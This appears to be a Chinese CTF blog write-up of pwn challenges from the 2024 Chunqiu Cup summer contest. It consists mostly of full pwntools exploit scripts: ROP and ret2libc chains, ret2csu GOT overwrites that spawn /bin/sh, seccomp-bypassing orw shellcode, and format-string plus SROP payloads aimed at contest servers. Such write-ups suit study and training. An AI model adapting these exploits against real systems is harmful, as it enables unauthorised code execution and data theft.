<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8" />
  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover" name="viewport" />
  <title>
    
    2024春秋杯夏季赛pwn 丨
    

    tw11ty&#39;s Blog
  </title>

  
  <link rel="shortcut icon" href="/icon.svg">
  

  <link rel="preconnect" href="https://cdnjs.cloudflare.com">
  
  <link id="theme" rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-light.css">
  <script src="https://unpkg.com/@highlightjs/cdn-assets@11.9.0/highlight.min.js"></script>
  

  <!-- 字体 -->
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Montserrat:ital,wght@0,100..900;1,100..900&display=swap" rel="stylesheet">
  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,100..800;1,100..800&display=swap" rel="stylesheet">

  
<link rel="stylesheet" href="/css/root.css">

  
<link rel="stylesheet" href="/css/style.css">

  
<link rel="stylesheet" href="/css/post.css">

<link rel="alternate" href="/atom.xml" title="tw11ty" type="application/atom+xml">
<link rel="stylesheet" href="/css/prism.css" type="text/css"></head>

<body>
  <header class="header">
  <section class="header-container">
    <a class="logo" href="/">tw11ty</a>
    <ul class="nav">
      
      <li><a href="/archives">归档</a></li>
      
      <li><a href="/about">关于</a></li>
      
      <li><a href="/group">友链</a></li>
      
    </ul>
  </section>
</header>
  <main class="main">
    <article class="post">
  
  <div class="post-title">2024春秋杯夏季赛pwn</div>
  <div class="post-meta">
    <div class="date">2024 July 7th</div>
    <div class="tags">
      
      <div class="tag-item">writewp</div>
      
    </div>
  </div>
  

  <main class="post-content"><h1 id="2024春秋杯夏季赛-pwn"><a href="#2024春秋杯夏季赛-pwn" class="headerlink" title="2024春秋杯夏季赛-pwn"></a>2024春秋杯夏季赛-pwn</h1><p>awdp没看，ctf只做出来两题，还有一题理论可行。</p>
<blockquote>
<p>参考博客：</p>
<p><a target="_blank" rel="noopener" href="https://starrysky1004.github.io/2024/07/05/2024-shu-qi-xue-xi-ji-lu/">https://starrysky1004.github.io/2024/07/05/2024-shu-qi-xue-xi-ji-lu/</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/imarch22/p/18288087#simplesys">2024春秋杯WP - lmarch2 - 博客园 (cnblogs.com)</a></p>
</blockquote>
<h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><p>- <a href="#stdout">stdout</a></p>
<ul>
<li><a href="#first">解法一</a></li>
<li><a href="#second">解法二</a></li>
<li><a href="#third">解法三</a></li>
</ul>
<p>- <a href="#Shuffled_Execution">Shuffled_Execution</a></p>
<p>- <a href="#Save_the_preceniss">Save the preceniss</a></p>
<ul>
<li><a href="#fail">不可能的爆破…</a></li>
<li><a href="#success">正确解法</a></li>
</ul>
<h2 id="stdout"><a href="#stdout" class="headerlink" title="stdout"></a>stdout<a id="stdout"></a></h2><p>libc版本：Ubuntu GLIBC 2.31-0ubuntu9.9</p>
<p>主函数溢出0x10字节，能覆盖到ret_addr；程序中有vuln函数，溢出 0x200-0x20 字节</p>
<p>初始化函数中   setvbuf(stdout, 0LL, 0, 0LL)设置为了标准输出无缓冲，setvbuf(stdin, 0LL, 2, 0LL)还是正常输出</p>
<pre class=" language-highlight c"><span class="type">int</span> <span class="title function_">init</span><span class="params"><code class="language-highlight c"><span class="type">int</span> <span class="title function_">init</span><span class="params">()</span>
&#123;
  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">0</span>, <span class="number">0LL</span>);
  <span class="keyword">return</span> setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);
&#125;</code></pre>





<p>看了其他师傅的，整理出来三种解法：</p>
<h3 id="解法一"><a href="#解法一" class="headerlink" title="解法一"></a>解法一<a id="first"></a></h3><p>每次十六分之一的概率，爆破stdout–&gt;_IO_2_1_stderr_，然后就能正常打印，再打ret2libc</p>
<pre class=" language-highlight python"><span class="comment"><code class="language-highlight python"><span class="comment">#coding:utf-8</span>
<span class="keyword">from</span> pwn <span class="keyword">import</span> *
<span class="keyword">from</span> tw11ty <span class="keyword">import</span> *
<span class="comment">#from ctypes import *</span>



<span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span> :
    context.log_level = <span class="string">&#x27;info&#x27;</span>
    IPort = <span class="string">&#x27;8.147.134.120 13093&#x27;</span>
    pwnfile = <span class="string">&#x27;./pwn&#x27;</span>
    libc_name = <span class="string">&#x27;/ctf/work/glibc-all-in-one/libs/2.31-0ubuntu9.9_amd64/libc.so.6&#x27;</span> 
    <span class="comment"># libc_name = &#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>
    elf  = ELF(pwnfile)
    rop  = ROP(pwnfile)
    libc = ELF(libc_name)

    <span class="keyword">while</span> <span class="literal">True</span>:
        <span class="keyword">try</span>:
            io = init(pwnfile, IPort, libc_name)

            vuln     = <span class="number">0x0040125D</span>
            prdi     = <span class="number">0x00000000004013d3</span>
            prsi_r15 = <span class="number">0x00000000004013d1</span>

            <span class="comment"># debug(&#x27;b *0x401286&#x27;)</span>
            s( <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x58</span> + p64(vuln))
            payload  = p64(prdi) + p64(<span class="number">0</span>) + p64(prsi_r15) + p64(<span class="number">0x00404070</span>) + p64(<span class="number">0</span>) + p64(elf.sym[<span class="string">&#x27;read&#x27;</span>])
            payload +=  p64(prdi) + p64(elf.got[<span class="string">&#x27;puts&#x27;</span>]) + p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>]) + p64(vuln)
            payload  = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span> + payload
            sl(payload)

            s(p16(<span class="number">0x95c0</span>))

            puts_addr = uu64(io.recv(<span class="number">6</span>, timeout=<span class="number">0.5</span>))
            <span class="keyword">if</span> puts_addr:
                log.success(<span class="string">"===The attack was successful==="</span>)
                libc_base = puts_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]
                system    = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]
                bin_bash  = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))
                leak(<span class="string">"libc_base"</span>, libc_base)
                leak(<span class="string">"puts_addr"</span>, puts_addr)
                payload   = cyclic(<span class="number">0x28</span>) + p64(prdi) + p64(bin_bash) + p64(system)
                <span class="comment"># sleep(0.5)</span>
                sl(payload)
                itr()
            <span class="keyword">else</span>:
                <span class="keyword">continue</span>
        <span class="keyword">except</span> EOFError:
            io.close()
            log.failure(<span class="string">"...The attack failed..."</span>)
            <span class="keyword">continue</span></code></pre>





<h3 id="解法二"><a href="#解法二" class="headerlink" title="解法二"></a>解法二<a id="second"></a></h3><p>下面这位师傅的解法：<a target="_blank" rel="noopener" href="https://starrysky1004.github.io/2024/07/05/2024-shu-qi-xue-xi-ji-lu/">https://starrysky1004.github.io/2024/07/05/2024-shu-qi-xue-xi-ji-lu/</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/AtomTeam/article/details/139672122">2024全国大学生信息安全竞赛（ciscn）半决赛（东北赛区）Pwn题解_2024ciscn华东北赛区wp-CSDN博客</a></p>
<blockquote>
<p><strong>setvbuf</strong></p>
<ul>
<li>全缓冲：0，<strong>缓冲区满</strong> 或 <strong>调用fflush()</strong> 后输出缓冲区内容。</li>
<li>行缓冲：1，<strong>缓冲区满</strong> 或 <strong>遇到换行符</strong> 或 <strong>调用fflush()</strong> 后输出缓冲区内容。</li>
<li>无缓冲：2，直接输出。</li>
</ul>
<p>全缓冲应对方法：</p>
<ul>
<li>调用setvbuf设置为无缓冲的stdout</li>
<li>调用fflush函数刷新缓冲区</li>
<li>填满缓冲区，程序会将所有的缓冲区内容全部输出</li>
</ul>
</blockquote>
<p>这位师傅就是利用程序中的extend()函数来填满缓冲区来拿libc</p>
<p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407071403848.png" alt="image-20240707140349798"></p>
<p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407071418049.png" alt="image-20240707141852935"></p>
<pre class=" language-highlight PYTHON"><span class="comment"><code class="language-highlight PYTHON"><span class="comment">#coding:utf-8</span>
<span class="keyword">from</span> pwn <span class="keyword">import</span> *
<span class="keyword">from</span> tw11ty <span class="keyword">import</span> *
<span class="comment">#from ctypes import *</span>

<span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span> :
    context.log_level = <span class="string">&#x27;info&#x27;</span>
    IPort = <span class="string">&#x27;8.147.134.120 13093&#x27;</span>
    pwnfile = <span class="string">&#x27;./pwn&#x27;</span>
    libc_name = <span class="string">&#x27;/ctf/work/glibc-all-in-one/libs/2.31-0ubuntu9.9_amd64/libc.so.6&#x27;</span> 
    <span class="comment"># libc_name = &#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>
    elf  = ELF(pwnfile)
    rop  = ROP(pwnfile)
    libc = ELF(libc_name)

    io = init(pwnfile, IPort, libc_name)

    vuln     = <span class="number">0x0040125D</span>
    prdi     = <span class="number">0x00000000004013d3</span>
    ret      = prdi + <span class="number">1</span>
    prsi_r15 = <span class="number">0x00000000004013d1</span>

    payload = cyclic(<span class="number">0x58</span>) + p64(elf.sym[<span class="string">&#x27;vuln&#x27;</span>])
    s(payload)

    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">150</span>):
        payload = cyclic(<span class="number">0x28</span>) + p64(elf.sym[<span class="string">&#x27;extend&#x27;</span>]) + p64(prdi) + p64(elf.got[<span class="string">&#x27;puts&#x27;</span>]) + p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>]) + p64(elf.sym[<span class="string">&#x27;vuln&#x27;</span>])
        sl(payload)
        success(i)
        <span class="keyword">try</span>:
            res = io.recvuntil(<span class="string">b&#x27;hello!\n&#x27;</span>, timeout=<span class="number">0.1</span>)
            <span class="keyword">if</span> res:
                libc_base = uu64(r64()) - libc.sym[<span class="string">&#x27;puts&#x27;</span>]
                <span class="keyword">break</span>
        <span class="keyword">except</span> EOFError:
            <span class="keyword">continue</span>
        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:
            log.error(<span class="string">f"...error occurred: <span class="subst">&#123;e&#125;</span>"</span>)
            <span class="keyword">continue</span>
        <span class="keyword">finally</span>:
            <span class="keyword">pass</span>
    leak(<span class="string">"libc_base"</span>, libc_base)

    system    = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]
    bin_bash  = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))
    payload   = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x28</span> + p64(prdi) + p64(bin_bash) + p64(system)
    sl(payload)
    leak(<span class="string">"system"</span>, system)

    itr()
    <span class="comment"># debug()</span>
    <span class="comment"># leak("puts_addr", puts_addr)</span>

</code></pre>





<h3 id="解法三"><a href="#解法三" class="headerlink" title="解法三"></a>解法三<a id="third"></a></h3><p>参考这位师傅的博客：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/imarch22/p/18288087#simplesys">2024春秋杯WP - lmarch2 - 博客园 (cnblogs.com)</a></p>
<p>在setvbuf附近找到syscall，read调rax，然后利用csu调寄存器、调到syscall执行execve(‘&#x2F;bin&#x2F;sh\x00’)</p>
<p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407071508360.png" alt="image-20240707150839242"></p>
<pre class=" language-highlight python"><span class="comment"><code class="language-highlight python"><span class="comment">#coding:utf-8</span>
<span class="keyword">from</span> pwn <span class="keyword">import</span> *
<span class="keyword">from</span> tw11ty <span class="keyword">import</span> *
<span class="comment">#from ctypes import *</span>

<span class="keyword">def</span> <span class="title function_">csu</span>(<span class="params">rdi, rsi, rdx, func_addr</span>):
    payload = p64(csu1) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(rdi) + p64(rsi) + p64(rdx) + p64(func_addr) + p64(csu2)
    <span class="keyword">return</span> payload

<span class="comment"># .text:00000000004013B0 loc_4013B0:                             ; CODE XREF: __libc_csu_init+54↓j</span>
<span class="comment"># .text:00000000004013B0                 mov     rdx, r14</span>
<span class="comment"># .text:00000000004013B3                 mov     rsi, r13</span>
<span class="comment"># .text:00000000004013B6                 mov     edi, r12d</span>
<span class="comment"># .text:00000000004013B9                 call    ds:(__frame_dummy_init_array_entry - 403E10h)[r15+rbx*8]</span>
<span class="comment"># .text:00000000004013BD                 add     rbx, 1</span>
<span class="comment"># .text:00000000004013C1                 cmp     rbp, rbx</span>
<span class="comment"># .text:00000000004013C4                 jnz     short loc_4013B0</span>
<span class="comment"># .text:00000000004013C6</span>
<span class="comment"># .text:00000000004013C6 loc_4013C6:                             ; CODE XREF: __libc_csu_init+35↑j</span>
<span class="comment"># .text:00000000004013C6                 add     rsp, 8</span>
<span class="comment"># .text:00000000004013CA                 pop     rbx</span>
<span class="comment"># .text:00000000004013CB                 pop     rbp</span>
<span class="comment"># .text:00000000004013CC                 pop     r12</span>
<span class="comment"># .text:00000000004013CE                 pop     r13</span>
<span class="comment"># .text:00000000004013D0                 pop     r14</span>
<span class="comment"># .text:00000000004013D2                 pop     r15</span>
<span class="comment"># .text:00000000004013D4                 retn</span>

<span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span> :
    context.log_level = <span class="string">&#x27;info&#x27;</span>
    IPort = <span class="string">&#x27;8.147.134.120 13093&#x27;</span>
    pwnfile = <span class="string">&#x27;./pwn&#x27;</span>
    libc_name = <span class="string">&#x27;/ctf/work/glibc-all-in-one/libs/2.31-0ubuntu9.9_amd64/libc.so.6&#x27;</span> 
    <span class="comment"># libc_name = &#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>
    elf  = ELF(pwnfile)
    rop  = ROP(pwnfile)
    libc = ELF(libc_name)


    io = init(pwnfile, IPort, libc_name)

    extend      = <span class="number">0x401287</span>
    vuln        = <span class="number">0x40125D</span>
    main        = <span class="number">0x401333</span>
    flag        = <span class="number">0x404070</span> + <span class="number">0x100</span>
    read_plt    = elf.sym[<span class="string">&#x27;read&#x27;</span>]
    setvbuf_got = elf.got[<span class="string">&#x27;setvbuf&#x27;</span>]
    prsi_r15    = <span class="number">0x00000000004013d1</span>
    prdi        = <span class="number">0x00000000004013d3</span>
    csu1        = <span class="number">0x4013CA</span>
    csu2        = <span class="number">0x4013B0</span>

    s( <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x58</span> + p64(vuln))

    <span class="comment">#bss_addr : "flag"</span>
    payload = cyclic(<span class="number">0x28</span>) + p64(prdi) + p64(<span class="number">0</span>) + p64(prsi_r15) + p64(flag) + p64(<span class="number">0</span>) + p64(read_plt) + p64(vuln) 
    sl(payload)
    sleep(<span class="number">0.5</span>)
    sl(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)

    <span class="comment">#setvbuf_got-->syscall</span>
    <span class="comment"># debug()</span>
    payload  = cyclic(<span class="number">0x28</span>) + p64(prdi) + p64(<span class="number">0</span>) + p64(prsi_r15) + p64(setvbuf_got) + p64(<span class="number">0</span>) + p64(read_plt)  <span class="comment">#改setvbuf为syscall</span>
    payload += p64(prsi_r15) + p64(flag+<span class="number">0x100</span>)+p64(<span class="number">0</span>)+p64(read_plt)     <span class="comment">#通过read输入长度调整rax，配合csu实现execve("/bin/sh\x00", 0, 0)</span>
    payload += csu(flag, <span class="number">0</span>, <span class="number">0</span>, setvbuf_got)

    s(payload)
    <span class="comment"># pause()</span>
    s(p8(<span class="number">0x34</span>))
    <span class="comment"># pause()</span>
    s(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x3b</span>)

    <span class="comment"># debug()</span>
    itr()</code></pre>

<p>如果是改别的函数的话会有些麻烦，例如puts，低一字节变化范围内，libc里是没有syscall指令的，需要爆破低二字节高位，也就是十六分之一的概率</p>
<p>如果是rand或者srand，因为存在延迟绑定，got表还没有跟libc中的函数地址相关联，需要调用一次，那么需要在改got前执行一次extend()函数才能改它们的got表地址</p>
<p>总的说这位师傅的wp已经是极简的了。</p>
<h2 id="Shuffled-Execution"><a href="#Shuffled-Execution" class="headerlink" title="Shuffled_Execution"></a>Shuffled_Execution<a id="Shuffled_Execution"></a></h2><p>libc：2.35-0ubuntu3.8_amd64</p>
<p>先用\x00开头的shellcode绕过shuffle()的加密</p>
<p>shellcode绕沙盒的题目，没什么太多好讲的，主要是对orw的替换</p>
<p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407071529824.png" alt="image-20240707152951757"></p>
<blockquote>
<p>一些orw惯用方法：</p>
<p>1.函数替换： cat &#x2F;usr&#x2F;include&#x2F;x86_64-linux-gnu&#x2F;asm&#x2F;unistd_64.h | grep xxx</p>
<blockquote>
<p>open  openat  openat2 ……</p>
<p>read  readv  preadv  pread64    <strong>mmap</strong> preadv2 ……</p>
<p>write  writev pwritev ……</p>
</blockquote>
<p>2.利用4字节系统调用号绕过</p>
<p>使用seccomp-tools，如果没有判断sys_number &gt;&#x3D; 0x40000000（不存在<strong>A !&#x3D; ARCH_X86_64</strong>），可以使用<strong>0x40000000|sys_number</strong> 来绕过</p>
<p>3.侧信道爆破</p>
<p>write相关函数无法使用，需要利用侧信道来爆破flag</p>
<p>也会使用mprotect来辅助orw的使用</p>
</blockquote>
<pre class=" language-highlight python"><span class="comment"><code class="language-highlight python"><span class="comment">#coding:utf-8</span>
<span class="keyword">from</span> pwn <span class="keyword">import</span> *
<span class="keyword">from</span> tw11ty <span class="keyword">import</span> *
<span class="comment"># from ctypes import *</span>
<span class="comment"># import ctypes</span>

<span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span> :
    <span class="comment"># context.log_level = &#x27;info&#x27;</span>
    IPort = <span class="string">&#x27;8.147.135.233 41323&#x27;</span>
    pwnfile = <span class="string">&#x27;./Shuffled_Execution&#x27;</span>
    libc_name = <span class="string">&#x27;/root/glibc-all-in-one/libs/2.35-0ubuntu3.8_amd64/libc.so.6&#x27;</span> 
    elf  = ELF(pwnfile)
    rop  = ROP(pwnfile)
    libc = ELF(libc_name)

    io = init(pwnfile, IPort, libc_name)
    <span class="comment"># debug(&#x27;b *$rebase(0x1560)&#x27;)  #x/10i 0x1337000</span>
    shellcode = asm(<span class="string">"""</span>
<span class="string">        add al, al</span>
<span class="string">        mov rsp, rax</span>
<span class="string">        add rsp, 0x500</span>
<span class="string">        mov r12, 0x67616c66   </span>
<span class="string">        push r12</span>
<span class="string">        mov rsi, rsp</span>
<span class="string">        mov rdi, -100</span>
<span class="string">        mov rdx, 0</span>
<span class="string">        mov rax, 257</span>
<span class="string">        syscall        </span>
<span class="string"></span>
<span class="string">        mov rdi, 0x10000</span>
<span class="string">        mov rsi, 0x100</span>
<span class="string">        mov rdx, 1</span>
<span class="string">        mov rcx, 2</span>
<span class="string">        mov r8, rax</span>
<span class="string">        mov r10, 2</span>
<span class="string">        mov rax, 9</span>
<span class="string">        syscall</span>
<span class="string"></span>
<span class="string">        mov rdi, 0x1</span>
<span class="string">        mov rdx, 0x1</span>
<span class="string">        push 0x100</span>
<span class="string">        push rax</span>
<span class="string">        mov rsi, rsp</span>
<span class="string">        mov rax,0x14</span>
<span class="string">        syscall</span>
<span class="string">"""</span>)
    s(shellcode)
    itr()
</code></pre>





<h2 id="Save-the-preceniss"><a href="#Save-the-preceniss" class="headerlink" title="Save the preceniss"></a>Save the preceniss<a id="Save_the_preceniss"></a></h2><h3 id="不可能的爆破"><a href="#不可能的爆破" class="headerlink" title="不可能的爆破"></a>不可能的爆破<a id="fail"></a></h3><p>这题没出，路走歪了。一直在尝试爆srand(0)，本地debug可以出，理论可行。。。</p>
<p>记混了，四字节爆破16^8，概率太低了</p>
<p>本地调通</p>
<p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407071611991.png" alt="image-20240707161117801"></p>
<p>openat+SROP调用mmap + write，因为爆不出来所以就不多写了</p>
<pre class=" language-highlight python"><span class="comment"><code class="language-highlight python"><span class="comment">#coding:utf-8</span>
<span class="keyword">from</span> pwn <span class="keyword">import</span> *
<span class="keyword">from</span> tw11ty <span class="keyword">import</span> *
<span class="keyword">from</span> ctypes <span class="keyword">import</span> *

<span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span> :
    context.log_level = <span class="string">&#x27;info&#x27;</span>
    IPort = <span class="string">&#x27;8.147.128.54 44681&#x27;</span>
    pwnfile = <span class="string">&#x27;./SavethePrincess&#x27;</span>
    libc_name = <span class="string">&#x27;/root/glibc-all-in-one/libs/2.35-0ubuntu3.8_amd64/libc.so.6&#x27;</span> 
    elf  = ELF(pwnfile)
    rop  = ROP(pwnfile)
    libc = ELF(libc_name)
    cdll = cdll.LoadLibrary(libc_name)

    <span class="keyword">while</span> <span class="literal">True</span>:
        <span class="keyword">try</span>:
            io = init(pwnfile, IPort, libc_name)
            passwd = <span class="string">b&#x27;nwlrbbmq\x00&#x27;</span>   <span class="comment">#--> srand(0)</span>
            <span class="comment">#leak_base</span>
            sla(<span class="string">b&#x27;> \n&#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>))
            <span class="comment"># debug(&#x27;set &#123;char[8]&#125; $rebase(0x04050) = "nwlrbbmq"\n \</span>
            <span class="comment">#       tele $rebase(0x04050) \n \</span>
            <span class="comment">#       b *$rebase(0x016c5)&#x27;)</span>
            sla(<span class="string">b&#x27;please input your password: \n&#x27;</span>, <span class="string">b&#x27;AAA&#x27;</span>)
            ru(<span class="string">b&#x27;AAA&#x27;</span>)
            base = u64(r(<span class="number">6</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) + <span class="number">0x356</span>
            bss  = base + <span class="number">0x4080</span>

            <span class="comment">#leak_canary&libc_base</span>
            sla(<span class="string">b&#x27;> \n&#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>))
            <span class="comment"># pause()</span>
            sla(<span class="string">b&#x27;please input your password: \n&#x27;</span>, passwd)
            io.recvline()
            info = io.recvline(timeout=<span class="number">0.2</span>)
            <span class="built_in">print</span>(<span class="string">"info = "</span>, info)
            <span class="keyword">if</span> <span class="keyword">not</span> info.startswith(<span class="string">b",nononno"</span>):
                <span class="comment"># io.recvuntil(b&#x27;successfully, Embrace the power!!!\n&#x27;)</span>
                sl(<span class="string">b&#x27;%9$p-%10$p-%35$p&#x27;</span>)
                io.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)
                canary = <span class="built_in">int</span>(io.recv(<span class="number">16</span>), <span class="number">16</span>)
                ru(<span class="string">b&#x27;0x&#x27;</span>)
                stack = <span class="built_in">int</span>(io.recv(<span class="number">12</span>), <span class="number">16</span>)
                ru(<span class="string">b&#x27;0x&#x27;</span>)
                libc_base = <span class="built_in">int</span>(r(<span class="number">12</span>), <span class="number">16</span>) - <span class="number">0x29e40</span>
                leak(<span class="string">"canary"</span>, canary)
                leak(<span class="string">"libc_base"</span>, libc_base)
                leak(<span class="string">"stack"</span>, stack)

                prax = libc_base + <span class="number">0x0000000000045eb0</span>
                prdi = libc_base + <span class="number">0x000000000002a3e5</span>
                prcx = libc_base + <span class="number">0x000000000003d1ee</span>
                prsi = libc_base + <span class="number">0x000000000002be51</span>
                pr8 = libc_base + <span class="number">0x00000000001659e6</span>
                pr10 = libc_base + <span class="number">0x0000000000053b00</span>
                prdx__r12 = libc_base + <span class="number">0x000000000011f2e7</span>
                syscall = libc_base + <span class="number">0x0000000000091316</span>
                pat = libc_base + <span class="number">0x0000000000114534</span>
                pr12 = libc_base + <span class="number">0x0000000000035731</span>
                push_r12_eax1 = libc_base + <span class="number">0x0000000000165a06</span>

                flag_addr = stack - <span class="number">0x60</span>

                sla(<span class="string">b&#x27;> \n&#x27;</span>, <span class="built_in">str</span>(<span class="number">2</span>))

                openat  = p64(prdi) + p64(<span class="number">0xffffffffffffff9c</span>) + p64(prsi) + p64(flag_addr) + p64(prdx__r12) + p64(<span class="number">0</span>)*<span class="number">2</span> + p64(prax) + p64(<span class="number">257</span>) + p64(syscall)
                write = p64(prdi) + p64(<span class="number">1</span>) + p64(prsi) + p64(libc_base + <span class="number">0x262000</span>) + p64(prdx__r12) + p64(<span class="number">0x20</span>)*<span class="number">2</span> + p64(prax) + p64(<span class="number">1</span>) + p64(syscall)

                frame_mmap = SigreturnFrame()
                frame_mmap.rdi = flag_addr + <span class="number">8</span>
                frame_mmap.rsi = <span class="number">0x20</span>
                frame_mmap.rdx = <span class="number">1</span>
                frame_mmap.r8  = <span class="number">3</span>
                frame_mmap.r9  = <span class="number">0</span>
                frame_mmap.r10 = <span class="number">2</span>
                frame_mmap.rax = <span class="number">9</span>
                frame_mmap.rip = syscall
                frame_mmap.rsp = flag_addr + <span class="number">0x60</span> + <span class="built_in">len</span>(openat) + <span class="built_in">len</span>(frame_mmap)

                payload  = <span class="string">b&#x27;flag\x00\x00\x00\x00&#x27;</span> + <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span> + p64(canary) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span> + openat 
                payload += p64(prax) + p64(<span class="number">0xf</span>) + p64(syscall) + flat(frame_mmap)
                payload += write

                sla(<span class="string">b&#x27;Attack the dragon!!\n&#x27;</span>, payload)

                <span class="comment"># leak("base", base)</span>
                ru(<span class="string">b&#x27;Did you succeed?\n&#x27;</span>)
                info = io.recv(timeout=<span class="number">0.1</span>)
                io.close()
                <span class="keyword">if</span> <span class="keyword">not</span> info.startswith(<span class="string">b&#x27;flag&#x27;</span>):
                    <span class="keyword">continue</span>
                <span class="keyword">else</span>:
                    log.success(<span class="string">"u win!!!"</span>)
                    <span class="built_in">print</span>(<span class="string">"flag is "</span>, info)
                    <span class="keyword">break</span>
            <span class="keyword">else</span>:
                <span class="keyword">continue</span>
        <span class="keyword">except</span> EOFError:
            <span class="keyword">continue</span>
        <span class="keyword">finally</span>:
            <span class="keyword">pass</span></code></pre>

<p>ps：syscall ret指令的寻找：ROPgadget –multibr –binary&#x3D;&#x2F;root&#x2F;glibc-all-in-one&#x2F;libs&#x2F;2.35-0ubuntu3.8_amd64&#x2F;libc.so.6 | grep “syscall”</p>
<p>python低版本中的ctypes库在加载高版本的libc.so文件时会加载失败，需要使用高版本python(python3.8加载libc2.35失败)</p>
<h3 id="正确解法"><a href="#正确解法" class="headerlink" title="正确解法"></a>正确解法<a id="success"></a></h3><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/imarch22/p/18288087#stdout">lmarch2</a>师傅有写</p>
<p>自己太粗心了，没观察到栈信息，直接想着用&#x2F;dev&#x2F;urandom的绕过了。通过爆破love字符串，输入buf长度为0xa带出循环次数i，通过判断i位置来判断passwd字段是否正确</p>
<p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407071622115.png" alt="image-20240707162258071"></p>
<p>exp就不贴了。</p>
<p>暑假的第一场比赛，算是尽心尽力了。</p>
</main>

</article>


<script src="/js/highlight.js"></script>

  </main>
  <footer class="footer">
  
  <span>Copyright © 2024 typo</span>
  
</footer>
  
<script src="/js/theme.js"></script>

</body>

</html>